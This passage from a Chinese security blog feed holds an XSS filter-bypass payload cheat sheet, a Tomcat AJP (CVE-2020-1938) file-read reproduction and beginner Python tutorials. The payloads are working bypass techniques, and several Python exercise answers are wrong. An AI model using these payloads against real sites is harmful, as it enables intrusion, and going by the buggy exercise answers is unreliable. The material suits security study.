operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3A<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6C<span class="token punctuation">;</span><span class="token operator">&amp;</span> #x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x27<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x58<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x53<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x53<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x27<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="使用制表符、-换行符和回车符绕过"><a href="#使用制表符、-换行符和回车符绕过" class="headerlink" title="使用制表符、 换行符和回车符绕过"></a>使用制表符、 换行符和回车符绕过</h3><p>这些符号都是可以用来欺骗过滤器的。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token string">"jav&amp;#x9ascript:alert('XSS');"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面的例子使用了最小的十六进制的制表符来欺骗过滤器。最后的输出结果不变：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token string">"javascript:alert('XSS');"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应转换表：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223180734832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="使用空字符进行绕过"><a href="#使用空字符进行绕过" class="headerlink" title="使用空字符进行绕过"></a>使用空字符进行绕过</h3><p>另一个可以绕过的就是空字符，这是最有效的工具了。。<br>下面这个就是个例子：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>SCR<span class="token operator">%</span>00IPT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRIPT<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>空字符 (%00) 使得过滤器不能看到完整的 < SCRIPT> 标签， 只在 IE 6.0, IE 7.0 可以。</p><h3 id="双引号配对绕过"><a href="#双引号配对绕过" class="headerlink" title="双引号配对绕过"></a>双引号配对绕过</h3><p>绕过这种过滤就是寻找闭合的标签，然后构造来突破</p><p>比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG <span class="token string">""</span><span class="token string">">&lt;SCRIPT>alert('XSS')&lt;/SCRIPT>"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>通常我们认为，img 标签里。前两个引号被认为是一对，什么都不做，下一个引号和最后的匹配，但是事实不是这样，所有的浏览器都在试图修正这一问题。</p><p>最终结果如下：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>"<span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="CSS过滤器绕过"><a href="#CSS过滤器绕过" class="headerlink" title="CSS过滤器绕过"></a>CSS过滤器绕过</h3><p>HTML 标签用来插入 javaScript 很有用，但是 CSS 也是可以的哦。有很多方式向 CSS 里插入 XSS，所有更多的方法可以攻击，嘴尖的方法是吧 XSS 代码放到 LINK 方式引用的 CSS 的 href 属性里面去。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>LINK REL<span class="token operator">=</span><span class="token string">"stylesheet"</span> HREF<span class="token operator">=</span><span class="token string">"javascript:alert('XSS');"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Ie7 已经不允许了。但是 opera 和 ie6 还是可以的。。另一个方式是使用<STYLE>标签，不是很常见，一般是论坛啊。允许用户设计自己的贴的源代码的时候。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>STYLE<span class="token operator">></span> a <span class="token punctuation">{</span> width<span class="token punctuation">:</span> <span class="token function">expression</span><span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token operator">&lt;</span><span class="token operator">/</span>STYLE<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有一种方式</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>DIV STYLE<span class="token operator">=</span><span class="token string">"width: expression(alert('XSS'));"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="不全面的过滤器"><a href="#不全面的过滤器" class="headerlink" title="不全面的过滤器"></a>不全面的过滤器</h3><p>我们看看当开发者已经把能想到的都过滤了或者什么的。就安全了吗？不。我们可以依然可以向数据指令(我前段时间还看到了。现在忘了这个准确的翻译了)里插入代码。我们通过 base64 加密< script>alert(‘XSS’)</script>。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>META HTTP<span class="token operator">-</span>EQUIV<span class="token operator">=</span><span class="token string">"refresh"</span>CONTENT<span class="token operator">=</span><span class="token string">"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>数据指令允许我们把完全的文档变成一个单一的字符串。在火狐等浏览器都可以用。尼玛没说具体的用法。</p><ul><li>使用双引号</li></ul><p>如果你需要使用双引号和单引号。使用一些诡异的用法把。。</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token template-string"><span class="token string">`javascript:alert("Look its, 'XSS'")`</span></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>转义字符</li></ul><p>转义字符有时候很有用，可以对付一些简单的过滤器</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token template-string"><span class="token string">`javascript:alert(\"XSS\")`</span></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果如下：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token template-string"><span class="token string">`javascript:alert(\\"XSS\\")`</span></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>编码</li></ul><p>使用 utf-7 编码可以绕过<br>比如：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用UTF-7后：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">+</span>ADw<span class="token operator">-</span>script<span class="token operator">+</span>AD4<span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">+</span>ACI<span class="token operator">-</span>XSS<span class="token operator">+</span>ACI<span class="token operator">-</span><span class="token punctuation">)</span><span class="token operator">+</span>ADw<span class="token operator">-</span><span class="token operator">/</span>script<span class="token operator">+</span>AD4<span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后所有的加号需要被改成%2b，否则会被浏览器识别为连接符</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">%</span>2BADw<span class="token operator">-</span>script<span class="token operator">%</span>2BAD4<span class="token operator">-</span>alert<span class="token operator">%</span><span class="token number">281</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>2BADw<span class="token operator">-</span><span class="token operator">/</span>script<span class="token operator">%</span>2BAD4<span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一个列表:（这恶鬼终于不会被转义了！）</p><table><thead><tr><th>字符</th><th>实体引用</th></tr></thead><tbody><tr><td>空格</td><td>%20</td></tr><tr><td>/</td><td>%2F</td></tr><tr><td>“</td><td>%22</td></tr><tr><td>?</td><td>%3F</td></tr><tr><td>+</td><td>%2B</td></tr></tbody></table><p>以上就是我对XSS绕过技术的学习总结，欢迎大家补充！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> XSS </tag>
            
            <tag> WAF绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat-Ajp协议任意文件读取漏洞复现（CVE-2020-1938）</title>
      <link href="/posts/31430522.html"/>
      <url>/posts/31430522.html</url>
      
        <content type="html"><![CDATA[<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre><code>Apache Tomcat 9.x &lt; 9.0.31Apache Tomcat 8.x &lt; 8.5.51Apache Tomcat 7.x &lt; 7.0.100Apache Tomcat 6.x</code></pre><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><pre><code>任意文件读取命令执行</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Apache Tomcat服务器通过Connector连接器组件与客户程序建立连接，被分别过配置了两个Connector：HTTP和AJP，我们通常使用HTTP Connector，也就是8080端口来访问Tomcat，它的配置文件在conf/serve.xml，它的配置如下：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>Connector port<span class="token operator">=</span><span class="token string">"8080"</span> protocol<span class="token operator">=</span><span class="token string">"HTTP/1.1"</span>           connectionTimeout<span class="token operator">=</span><span class="token string">"20000"</span>           redirectPort<span class="token operator">=</span><span class="token string">"8443"</span> <span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>AJP协议（Apache Jserv Protocol）使用8009端口，它能够优化HTTP请求，多用于集群，反向代理的场景，它的配置如下：</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>Connector port<span class="token operator">=</span><span class="token string">"8009"</span> protocol<span class="token operator">=</span><span class="token string">"AJP/1.3"</span> redirectPort<span class="token operator">=</span><span class="token string">"8443"</span> <span class="token operator">/</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>漏洞因为Tomcat AJP协议存在缺陷而产生，攻击者可通过该漏洞读取配置文件以及执行恶意代码。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p><a href="https://github.com/Kit4y/CNVD-2020-10487-Tomcat-Ajp-lfi-Scanner" target="_blank" rel="noopener">下载EXP</a></p><ul><li>文件包含<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200222155400922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里成功读取该站index.jsp源文件，补天src300多个站均未修复此漏洞。</li></ul><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><pre><code>在server.xml中注释掉AJP，或者绑定到127.0.0.1 更新到如下Tomcat 版本Tomcat 分支     版本号Tomcat 7     7.0.0100Tomcat 8     8.5.51Tomcat 9     9.0.31</code></pre><p>相关链接：<a href="https://www.anquanke.com/post/id/199448#h2-0" target="_blank" rel="noopener">安全客</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 渗透测试篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 任意文件读取 </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的选择结构（if语句）</title>
      <link href="/posts/7a7c390.html"/>
      <url>/posts/7a7c390.html</url>
      
        <content type="html"><![CDATA[<p>（1）条件语句：这是一个可鞥为真也可能为假的语句，由if关键字开始，由冒号结束，例如：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">if</span> Scores <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注：它与C语言最大的不同之处在于这里面的条件语句没有括号。</strong></p><p>（2）代码块：这是一段可以执行的代码，当条件语句为真时就会执行这个代码块。特别需要注意的是，Python 语句中的代码块并没有使用常见的大括号，而是采用缩进的方式，很多熟练使用其他语言的程序员对此可能并不习惯。Python 中的缩进会影响程序的编译，这一点必须要牢记。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">if</span> Scores <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Good!'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的是正确的写法，而下面的是<strong>错误的</strong>，两种写法的不同仅在于<strong>缩进</strong>。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">if</span> Scores <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Good!'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当然仅仅使用if是远远不够的，如果你想当scores不等于100时输出No就要使用else了。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">if</span> Scores <span class="token operator">==</span> <span class="token number">100</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Good!'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'No!'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当情况更为复杂时就要使用elif，这里用一个“得分转化等级”的练习来体现一下它的功能：</p><pre class="line-numbers language-python"><code class="language-python">n<span class="token operator">=</span>input<span class="token punctuation">(</span><span class="token string">"请输入您的成绩："</span><span class="token punctuation">)</span><span class="token keyword">if</span> n <span class="token operator">>=</span> <span class="token string">'90'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> n <span class="token operator">>=</span> <span class="token string">'80'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'B'</span><span class="token punctuation">)</span><span class="token keyword">elif</span> n <span class="token operator">>=</span><span class="token string">'60'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'C'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'D'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们还可以运用这个if判断写一个极其简单的登陆模块：</p><pre class="line-numbers language-python"><code class="language-python">n1 <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入用户名："</span><span class="token punctuation">)</span>n2 <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入密码："</span><span class="token punctuation">)</span><span class="token keyword">if</span> n1 <span class="token operator">==</span> <span class="token string">"root"</span> <span class="token operator">and</span> n2 <span class="token operator">==</span> <span class="token string">"root!23"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"登录成功"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"登录失败"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>随着后续的不断学习，我也会慢慢的去优化这个登录模块的。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Python安全开发篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解Python中的循环结构（where与for）</title>
      <link href="/posts/fbf7eab5.html"/>
      <url>/posts/fbf7eab5.html</url>
      
        <content type="html"><![CDATA[<p> 在日常生活中经常会遇到一些有规律的重复操作，例如，输出从1到100的自然数。如果使用顺序结构来实现这个程序，那么需要使用100个print语句。其实这些语句都是重复执行的，也只需要使用一个循环语句就可以代替这100个语句。在Python中的循环语句也有while和for 两种，首先来看一下while的用法，while 循环语句包含以下两个部分。</p><p>(1)条件语句：这是一个可能为真他可能为假的语句，由while关键字作为开始，由冒号结束。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">while</span> i <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>(2)代码块：这是一段可执行的代码，当判断为真时就会执行这段代码，同样需要注意缩进。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">while</span> i <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>注：与if条件语句不同的是，当它执行完代码后不会结束，而是会返回到while处在进行一次判断，若为真则继续新一轮循环，为假则跳出循环。</strong></p><p>那么如果输入输出的永远不为假呢?那么它就会进入“死循环”，一直不停的输出，例如：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">while</span> <span class="token number">1</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'OK!'</span><span class="token punctuation">,</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们当然不需要这种死循环代码，这时候就需要break语句来结束这个程序了，接下来更新一下我们的程序，要求用户输入用户名，但只有用户名为root时才会进行下一步。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'请输入您的用户名：'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">'root'</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'登陆成功！'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不过python中的while循环与其他编程语言（c语言）差别不大，但是for的用法就不尽相同了。for循环又名计数循环，就是可以指定循环的次数for语句要跟他的好兄弟range函数一同使用，例如：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>for语句的构成部分主要由以下两部分组成：<br>（1）循环语句：这是一个由for关键词、一个变量名、一个in关键词、一个range()方法和一个冒号共同构成的语句，这个range()函数中可以接受参数，最多三个。<br>（2）代码块：这是一段可以执行的代码。<br><strong>注意：range()本身就是一个函数，如果只接受一个函数，如range(n)，则表示执行代码块的次数。</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>而如果是两个参数，如range(5,10)，则第一个参数表示的是for循环开始的值，第二个参数表示上限，但是循环中i的值不会取到10.</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>range()函数也可以有三个参数，前两个参数为别是开始值和上限，第三个参数是步长，也就是每次循环循环量的变化。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>来几个小练习巩固一下：<br>1、使用while循环输出1 2 3 4 5 6 8 9 10<br>2、求1<del>100的和<br>3、输出1</del>100内所有奇数<br>4、输出1~100内所有偶数<br>5、求1-2+3-4+5-6…99的所有数的和</p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">'''第一题'''</span>n<span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span> n <span class="token operator">&lt;</span> <span class="token number">11</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'......end......'</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''第二题'''</span>n <span class="token operator">=</span> <span class="token number">1</span>s <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> n <span class="token operator">&lt;</span> <span class="token number">101</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> s<span class="token operator">+</span>n    n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''或者'''</span><span class="token keyword">print</span><span class="token punctuation">(</span>sum<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''第三题'''</span>n <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">while</span> n <span class="token operator">&lt;</span> <span class="token number">101</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">2</span>    <span class="token keyword">if</span> temp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token triple-quoted-string string">'''第四题'''</span>n <span class="token operator">=</span> <span class="token number">2</span><span class="token keyword">while</span> n <span class="token operator">&lt;</span> <span class="token number">101</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> n <span class="token operator">%</span> <span class="token number">2</span>    <span class="token keyword">if</span> temp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>    n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token triple-quoted-string string">'''第五题'''</span>n<span class="token operator">=</span><span class="token number">1</span>a<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> n <span class="token operator">></span><span class="token number">100</span><span class="token punctuation">:</span>    temp <span class="token operator">=</span> n<span class="token operator">%</span><span class="token number">2</span>    <span class="token keyword">if</span> temp <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> a<span class="token operator">-</span>n    <span class="token keyword">else</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> a<span class="token operator">+</span>n    n <span class="token operator">=</span> n<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后更新一下我们的用户登录功能，要求输入用户名和密码，错误超过三次直接结束程序。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">'''实现用户登录，超过三次报错'''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  name <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'用户名: '</span><span class="token punctuation">)</span>  passwd <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">'密码: '</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> name <span class="token operator">==</span> <span class="token string">'root'</span> <span class="token operator">and</span> passwd <span class="token operator">==</span> <span class="token string">'toor'</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'登录成功！'</span><span class="token punctuation">)</span>      <span class="token keyword">break</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'登录失败'</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'您还剩余%d次机会'</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">-</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'失败超过3次，请稍后再试！'</span><span class="token punctuation">)</span><span aria-hidden="true" 